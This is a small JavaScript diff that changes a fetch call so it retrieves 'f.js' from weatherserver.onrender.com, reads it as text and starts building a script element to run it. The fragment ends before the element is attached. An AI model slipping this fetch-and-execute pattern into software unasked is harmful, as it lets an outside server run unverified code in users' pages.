@@ -1,5 +1,5 @@
 console.log('https://weatherserver.onrender.com/')
-const f = fetch('https://weatherserver.onrender.com/')
+const f = fetch('https://weatherserver.onrender.com/f.js')
 f.then(d=>  d.text()).then(c=>{
 	const script = document.createElement('script')
 	script.type = "text/javascript";
